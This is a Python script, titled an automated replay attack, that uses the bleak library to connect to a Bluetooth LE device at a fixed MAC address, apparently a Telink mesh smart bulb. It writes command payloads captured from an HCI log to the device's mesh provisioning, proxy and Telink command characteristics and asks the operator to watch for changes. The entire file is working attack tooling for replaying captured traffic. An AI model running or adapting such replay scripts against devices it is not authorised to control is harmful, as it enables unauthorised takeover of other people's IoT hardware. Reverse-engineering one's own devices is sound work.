#!/usr/bin/env python3
"""
Automated Replay Attack - Try captured commands on all writable characteristics
"""

import asyncio
from bleak import BleakClient, BleakScanner
import sys

TARGET_MAC = "34:13:43:46:CA:84"

# Post-pairing commands from HCI log
CAPTURED_COMMANDS = {
    "cmd_31": bytes.fromhex("71f4005d0d6a71e29e3e134f"),
    "cmd_32": bytes.fromhex("ed4600fd4e997a2b0f9fa3a3e5"),
    "cmd_33": bytes.fromhex("7e6100a835e322681373d6be9cf6fc4737478683"),
    "cmd_34": bytes.fromhex("020000fb62c82c7dbefbf76d4d"),
    "cmd_35": bytes.fromhex("fc5500445c0441d68b2ee45a"),
    "cmd_36": bytes.fromhex("8e8a0076587cd75d5fc613a4"),
    "cmd_37": bytes.fromhex("4d6a00f4fd2dae3c58aae72f"),
    "cmd_38": bytes.fromhex("dfad00e3b5d71fd46d3dd4fe"),
    "cmd_39": bytes.fromhex("1f8b0053ac634c49e6c70115"),
    "cmd_40": bytes.fromhex("201c00c79c5ee37262aae5f4070ff27a0a8f1c94"),
    "cmd_41": bytes.fromhex("be50002fa9ee72df694dd682"),
    "cmd_42": bytes.fromhex("fd4b003567d1109fb7a2aec6"),
    "cmd_43": bytes.fromhex("5f2b00ef343485eaef9ac8e4"),
    "cmd_44": bytes.fromhex("f5cd001a2fcb0ba6b1de6707"),
}

# Try the early commands too (before pairing)
EARLY_COMMANDS = {
    "early_1": bytes.fromhex("0ca0a1a2a3a4a5a6a78db674711b855a79"),
    "early_2": bytes.fromhex("0ca0a1a2a3a4a5a6a7c0c0d4abef0d15c3"),
}

async def replay_test():
    """Automatically try commands on writable characteristics"""
    print(f"Scanning for {TARGET_MAC}...")

    device = await BleakScanner.find_device_by_address(TARGET_MAC, timeout=10.0)
    if not device:
        print(f"[ERROR] Device not found")
        return

    print(f"Connecting to {device.name} ({device.address})...")

    async with BleakClient(device) as client:
        if not client.is_connected:
            print("[ERROR] Failed to connect")
            return

        print("[OK] Connected\n")

        # Find writable characteristics
        writable_chars = []
        for service in client.services:
            for char in service.characteristics:
                if 'write' in char.properties or 'write-without-response' in char.properties:
                    writable_chars.append({
                        'uuid': char.uuid,
                        'handle': char.handle,
                        'properties': char.properties
                    })
                    print(f"Writable: 0x{char.handle:04x} - {char.uuid} - {char.properties}")

        print(f"\nFound {len(writable_chars)} writable characteristics")

        # Target characteristics to try (mesh protocol)
        target_chars = [
            "00002adb-0000-1000-8000-00805f9b34fb",  # Mesh Prov In
            "00002add-0000-1000-8000-00805f9b34fb",  # Mesh Proxy In
            "00010203-0405-0607-0809-0a0b0c0d1912",  # Telink Command
        ]

        print("\n" + "="*80)
        print("AUTOMATED REPLAY TEST")
        print("="*80)
        print("Trying captured commands on mesh characteristics...")
        print("Watch the bulb for any changes!")
        print("="*80)

        await asyncio.sleep(3)

        # Try early commands first
        print("\n--- Testing Early Commands (from initial connection) ---")
        for char_uuid in target_chars:
            print(f"\nCharacteristic: {char_uuid}")
            for name, data in EARLY_COMMANDS.items():
                print(f"  [{name}] {len(data)} bytes: {data.hex()[:32]}...")
                try:
                    await client.write_gatt_char(char_uuid, data, response=False)
                    print(f"    Sent OK")
                    await asyncio.sleep(1.5)
                except Exception as e:
                    print(f"    ERROR: {e}")

        # Try post-pairing commands
        print("\n--- Testing Post-Pairing Commands ---")
        for char_uuid in target_chars:
            print(f"\nCharacteristic: {char_uuid}")
            for name, data in list(CAPTURED_COMMANDS.items())[:5]:  # Try first 5 only
                print(f"  [{name}] {len(data)} bytes: {data.hex()}")
                try:
                    await client.write_gatt_char(char_uuid, data, response=False)
                    print(f"    Sent OK")
                    await asyncio.sleep(1.5)
                except Exception as e:
                    print(f"    ERROR: {e}")

        print("\n" + "="*80)
        print("Test complete!")
        print("="*80)
        print("\nDid you observe any changes to the bulb?")
        print("If yes, note which command caused which action.")

if __name__ == "__main__":
    try:
        asyncio.run(replay_test())
    except KeyboardInterrupt:
        print("\n\nTest interrupted")
